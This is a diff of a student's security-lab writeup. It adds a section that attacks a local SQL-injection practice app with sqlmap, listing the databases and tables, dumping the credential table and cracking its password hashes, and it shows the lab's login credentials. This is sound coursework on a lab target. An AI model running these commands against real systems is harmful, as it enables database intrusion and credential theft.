@@ -68,7 +68,7 @@ docker build -t img4lab .
 ```
  docker run -it --privileged -v C:/Users/Lenovo/Seclabs:/home/seed/seclabs img4lab
 ```
-![alt text](image.png)
+![image]
 ### 2. Create and Compile c program and asm program
 -Create c program and asm program.
 ![alt text](image-1.png)
@@ -99,3 +99,71 @@ The next 4 bytes would overwrite the saved EBP.<br>
 To overwrite the return address to point to  the address of system() for a return-to-libc attack.<br>
 - 4 bytes for argument for system()
 ### 4. Use gdb
+# Task 2: Attack on the database of Vulnerable App from SQLi lab 
+
+- Start docker container from SQLi. 
+- Install sqlmap.
+- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 
+
+**Set up lab**
+```
+docker compose up -d
+```
+![alt text](image-5.png)
+
+- Install SQL map
+```
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+```
+
+- Access the login page SQLi LAB: http://localhost:3128/
+
+- Login this page:
+```
+username: admin
+password: seedadmin
+```
+**Question 1**: Use sqlmap to get information about all available databases
+**Answer 1**:
+```
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=admin&Password=seedadmin" --dbs
+```
+![alt text](image-6.png)
+![alt text](image-7.png)
+
+Sqlmap has successfully listed the databases. Two databases are available:
+
+ - **information_schema**: This is a standard system database in MySQL, containing metadata about the database itself.
+
+ - **sqllab_users**: This appears to be a custom database, likely containing user information or other relevant data.
+
+**Question 2**: Use sqlmap to get tables, users information
+
+**Answer 2**:
+Retrieve and list all the tables present in the **information_schema** database:
+```
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=admin&Password=seedadmin" -D information_schema --tables
+```
+![alt text](image-9.png)
+![alt text](image-8.png)
+
+The result shows that there are 79 tables within the **information_schema** database.
+
+**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
+
+**Answer 3**:
+```
+ python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=admin&Password=seedadmin" -D sqllab_users -T credential --dump
+```
+**Choose option 1**
+
+![alt text](image-10.png)
+![alt text](image-11.png)
+
+SQLmap is trying to crack hashed passwords (likely retrieved from the credential table) using a dictionary-based attack.
+
+The cracking process starts, and we can see it using several common suffixes ('1', '123', '12', etc.) to test combinations of potential passwords.
+SQLmap is running 8 parallel processes to speed up the dictionary attack.
+
+The image below shows the result of dumping the credential table from the sqllab_users database using SQLmap.
+![alt text](image-12.png)
